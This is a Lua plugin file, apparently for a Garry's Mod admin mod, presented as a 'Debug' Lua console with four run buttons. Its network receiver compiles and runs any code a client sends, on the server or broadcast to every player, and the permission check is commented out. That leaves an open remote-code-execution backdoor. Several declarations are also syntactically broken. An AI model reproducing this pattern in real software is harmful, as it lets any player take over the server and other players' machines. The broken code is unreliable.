-----
--DEBUG COMMAND FOR TESTING
-----
local PLUGIN = {}
PLUGIN.title = "Debug"
PLUGIN.author = "Trist"
PLUGIN.description = "DEBUG COMMAND FOR TESTING"
PLUGIN.command = "debug"
PLUGIN.usage = "lol I forgot to remove this"
if(SERVER)then
    util.AddNetworkString('trist_lua_console')
    util.AddNetworkString('trist_start_console')
    net.Receive('trist_lua_console',function(len,ply)
        --if(ply:EV_HasPrivilege("Lua Console"))then)
            local mode = net.ReadString()
            local str = net.ReadString()
            local err func = CompileString(str,ply:SteamID().." compiled code'")
            if(!err)then
                if(mode=="SERVER" or mode=="SHARED")then
                    local succ info = pcall(func)                    
                end
                if(mode=="CLIENT" or mode=="SHARED")then
                    net.Start('trist_lua_console')
                    net.WriteString(str)
                    net.Broadcast()
                end
                if(mode=="PLAYER")then
                    net.Start('trist_lua_console')
                    net.WriteString(str)
                    net.Send(ply)
                end
            else
                print(err)
        --        evolve:Notify(ply,err)
            end
        --else
        --    evolve:Notify( ply, evolve.colors.red, evolve.constants.notallowed )
        --end
    end)
end
function PLUGIN:Call(ply,args)
    net.Start('trist_start_console')
    net.Send(ply)
end
if(CLIENT)then
    net.Receive('trist_lua_console',function()
        local str = net.ReadString()
        local err func = CompileString(str,LocalPlayer():SteamID().." compiled code'")
        local succ info = pcall(func)        
    end)
    net.Receive('trist_start_console',function()
        local DP = vgui.Create("DFrame")    
        DP:SetSize( 600, 300 )
        DP:Center()
        DP:SetTitle( "Lua Console" )
        DP:SetDraggable(true)
        DP:MakePopup()

        local txt = vgui.Create("DTextEntry",DP)
        txt:SetPos(5,30)
        txt:SetSize(500,265)
        txt:SetText("")
        txt:SetMultiline(true)

        local DB = vgui.Create("DButton",DP)
        DB:SetSize(85,25)
        DB:SetPos(510,270)
        DB:SetText('server run')
        function DB:DoClick()
            net.Start('trist_lua_console')
            net.WriteString('SERVER')
            net.WriteString(txt:GetText())
            net.SendToServer()
        end

        DB = vgui.Create("DButton",DP)
        DB:SetSize(85,25)
        DB:SetPos(510,240)
        DB:SetText('client run')
        function DB:DoClick()
            net.Start('trist_lua_console')
            net.WriteString('CLIENT')
            net.WriteString(txt:GetText())
            net.SendToServer()
        end

        DB = vgui.Create("DButton",DP)
        DB:SetSize(85,25)
        DB:SetPos(510,210)
        DB:SetText('shared run')
        function DB:DoClick()
            net.Start('trist_lua_console')
            net.WriteString('SHARED')
            net.WriteString(txt:GetText())
            net.SendToServer()
        end

        DB = vgui.Create("DButton",DP)
        DB:SetSize(85,25)
        DB:SetPos(510,180)
        DB:SetText('run on me')
        function DB:DoClick()
            net.Start('trist_lua_console')
            net.WriteString('PLAYER')
            net.WriteString(txt:GetText())
            net.SendToServer()
        end
    end)
end
--CreateConVar('trist_reverse',0) hook.Add('PlayerSay','trist_reverse',function(ply,txt) if(GetConVar('trist_reverse'):GetBool())then return string.reverse(txt) end end)
--hook.Add('Think','trist_reverse',function() GetConVar('trist_reverse'):SetBool(os.time()%2==0) end)

autobox:RegisterPlugin(PLUGIN)